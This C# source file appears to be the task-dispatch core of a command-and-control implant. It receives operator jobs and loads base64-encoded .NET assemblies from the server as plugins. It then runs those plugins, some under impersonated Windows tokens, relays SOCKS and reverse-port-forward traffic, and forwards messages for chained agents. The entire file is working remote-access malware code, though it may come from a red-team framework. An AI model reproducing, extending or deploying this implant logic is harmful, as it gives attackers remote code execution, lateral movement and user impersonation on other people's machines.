using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Security.Principal;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace Agent.Managers
{
    public class TaskManager : ITaskManager
    {
        private ILogger logger { get; set; }
        public IAssemblyManager assemblyManager { get; set; }
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private readonly TimeSpan proxyDatagramTimeout;
        private readonly SemaphoreSlim proxyHandlerSlots = new(16, 16);
        public TaskManager(ILogger logger, IAssemblyManager assemblyManager, IMessageManager messageManager, ITokenManager tokenManager)
            : this(logger, assemblyManager, messageManager, tokenManager, TimeSpan.FromSeconds(30))
        {
        }

        public TaskManager(ILogger logger, IAssemblyManager assemblyManager, IMessageManager messageManager, ITokenManager tokenManager, TimeSpan proxyDatagramTimeout)
        {
            this.logger = logger;
            this.assemblyManager = assemblyManager;
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
            this.proxyDatagramTimeout = proxyDatagramTimeout;
        }

        public async Task StartTaskAsync(ServerJob job)
        {
            this.messageManager.AddJob(job);
            switch (job.task.command)
            {
                case "load":
                    HandleLoadPlugin(job);
                    break;
                case "load-assembly":
                    HandleLoadAssembly(job);
                    break;
                default:
                    _ = Task.Run(() => ExecutePluginTaskAsync(job));
                    break;
            }
        }

        private void HandleLoadPlugin(ServerJob job)
        {
            if (!TryParseLoadPayload(job, requireCommand: true, out LoadCommand command, out byte[] loadBuffer))
                return;

            bool loaded = this.assemblyManager.LoadPluginAsync(job.task.id, command.command, loadBuffer);
            var response = new LoadTaskResponse
            {
                completed = true,
                user_output = loaded
                    ? $"Loaded plugin {command.command}"
                    : $"Failed to load plugin {command.command}",
                task_id = job.task.id,
                commands = loaded
                    ? [new CommandsResponse { action = "add", cmd = command.command }]
                    : [],
            };
            this.messageManager.AddTaskResponse(response.ToJson(), job.task.id, response.completed);
        }

        private void HandleLoadAssembly(ServerJob job)
        {
            if (!TryParseLoadPayload(job, requireCommand: false, out _, out byte[] assemblyBuffer))
                return;

            this.assemblyManager.LoadAssemblyAsync(job.task.id, assemblyBuffer);
        }

        private bool TryParseLoadPayload(
            ServerJob job,
            bool requireCommand,
            out LoadCommand command,
            out byte[] payload)
        {
            command = null!;
            payload = [];
            LoadCommand? parsed;
            try
            {
                parsed = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
            }
            catch (Exception e) when (e is JsonException or FormatException or ArgumentNullException)
            {
                return FailMalformedLoad(job, e.Message);
            }

            if (parsed is null)
                return FailMalformedLoad(job, "Load parameters cannot be null.");

            if (requireCommand && (string.IsNullOrWhiteSpace(parsed.command) || string.IsNullOrWhiteSpace(parsed.asm)))
                return FailMalformedLoad(job, "Plugin command and assembly payload are required.");

            if (!requireCommand && string.IsNullOrWhiteSpace(parsed.asm))
                return FailMalformedLoad(job, "Assembly payload is required.");

            try
            {
                payload = Misc.Base64DecodeToByteArray(parsed.asm);
            }
            catch (FormatException e)
            {
                return FailMalformedLoad(job, e.Message);
            }

            if (payload.Length == 0)
                return FailMalformedLoad(job, "Assembly payload cannot be empty.");

            command = parsed;
            return true;
        }

        private async Task ExecutePluginTaskAsync(ServerJob job)
        {
            if (!this.assemblyManager.TryGetPlugin(job.task.command, out IPlugin? plug) || plug is null)
            {
                AddErrorTaskResponse(job.task.id, "Plugin not found. Please load it.");
                return;
            }

            try
            {
                if (job.task.token == 0)
                    await plug.Execute(job);
                else
                    tokenManager.RunTaskImpersonated(plug, job);
            }
            catch (Exception e)
            {
                AddErrorTaskResponse(job.task.id, e.ToString());
            }
        }

        private bool FailMalformedLoad(ServerJob job, string error)
        {
            AddErrorTaskResponse(job.task.id, error);
            this.messageManager.CompleteJob(job.task.id);
            return false;
        }

        private void AddErrorTaskResponse(string taskId, string error) =>
            this.messageManager.AddTaskResponse(new TaskResponse
            {
                task_id = taskId,
                user_output = error,
                status = "error",
                completed = true,
            });

        private bool TryResolveJobPlugin<T>(string taskId, out ServerJob job, out T plugin) where T : IPlugin
        {
            job = null!;
            plugin = default!;
            if (!this.messageManager.TryGetJob(taskId, out ServerJob? foundJob) || foundJob is null ||
                !this.assemblyManager.TryGetPlugin(foundJob.task.command, out T? foundPlugin) || foundPlugin is null)
            {
                return false;
            }

            job = foundJob;
            plugin = foundPlugin;
            return true;
        }

        public async Task HandleServerResponses(List<ServerTaskingResponse> responses)
        {
            List<Task> tasks = new List<Task>();
            foreach (var response in responses)
            {
                if (response is null || !TryResolveJobPlugin(response.task_id, out ServerJob job, out IFilePlugin plugin))
                {
                    continue;
                }

                Func<Task> dispatch = job.task.token > 0
                    ? () => tokenManager.HandleFilePluginImpersonated(plugin, job, response)
                    : () => plugin.HandleNextMessage(response);
                tasks.Add(HandleFileResponse(dispatch, response.task_id));
            }

            await Task.WhenAll(tasks);
        }

        private async Task HandleFileResponse(Func<Task> dispatch, string taskId)
        {
            try
            {
                await dispatch().ConfigureAwait(false);
            }
            catch (Exception e)
            {
                messageManager.WriteLine(e.ToString(), taskId, true, "error");
            }
        }
        public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
        {
            if (responses is null || !this.assemblyManager.TryGetPlugin<IProxyPlugin>(type, out var plugin) || plugin is null)
            {
                return;
            }

            if (type.Equals("socks", StringComparison.OrdinalIgnoreCase) ||
                type.Equals("rpfwd", StringComparison.OrdinalIgnoreCase))
            {
                this.logger?.Debug($"Handling {responses.Count} {type} datagram(s)");
            }
            else
            {
                this.logger?.Debug($"Handling proxy datagram batch for plugin '{type}' ({responses.Count} item(s))");
            }

            await Parallel.ForEachAsync(
                responses,
                new ParallelOptions { MaxDegreeOfParallelism = 16 },
                async (response, _) => await HandleProxyDatagram(plugin, response, proxyDatagramTimeout).ConfigureAwait(false))
                .ConfigureAwait(false);
        }

        private async Task HandleProxyDatagram(IProxyPlugin plugin, ServerDatagram response, TimeSpan timeout)
        {
            if (!await proxyHandlerSlots.WaitAsync(timeout).ConfigureAwait(false))
                return;

            Task handling;
            try
            {
                handling = plugin.HandleDatagram(response);
            }
            catch
            {
                proxyHandlerSlots.Release();
                // Proxy frames are independent. A malformed frame must not fail the batch.
                return;
            }

            Task completed = await Task.WhenAny(handling, Task.Delay(timeout)).ConfigureAwait(false);
            if (completed != handling)
            {
                _ = ReleaseProxySlotWhenComplete(handling);
                return;
            }

            await ReleaseProxySlotWhenComplete(handling).ConfigureAwait(false);
        }

        private async Task ReleaseProxySlotWhenComplete(Task handling)
        {
            try
            {
                await handling.ConfigureAwait(false);
            }
            catch
            {
                // Proxy frames are independent. A malformed frame must not fail the batch.
            }
            finally
            {
                proxyHandlerSlots.Release();
            }
        }
        public async Task HandleDelegateResponses(List<DelegateMessage> responses)
        {
            List<Task> tasks = new List<Task>();
            foreach (var response in responses)
            {
                if (response is null
                    || !this.assemblyManager.TryGetPlugin<IForwarderPlugin>(response.c2_profile, out var plugin)
                    || plugin is null)
                {
                    continue;
                }

                try
                {
                    tasks.Add(plugin.ForwardDelegate(response));
                }
                catch { }
            }
            await Task.WhenAll(tasks);
        }

        public async Task HandleInteractiveResponses(List<InteractMessage> responses)
        {
            List<Task> tasks = new List<Task>();
            foreach (var response in responses)
            {
                if (response is null || !TryResolveJobPlugin(response.task_id, out ServerJob job, out IInteractivePlugin plugin))
                {
                    continue;
                }

                if (job.task.token > 0)
                {
                    tasks.Add(Task.Run(() => tokenManager.HandleInteractivePluginImpersonated(plugin, job, response)));
                    continue;
                }

                try
                {
                    tasks.Add(Task.Run(() => plugin.Interact(response)));
                }
                catch { }
            }

            await Task.WhenAll(tasks);
        }
    }
}
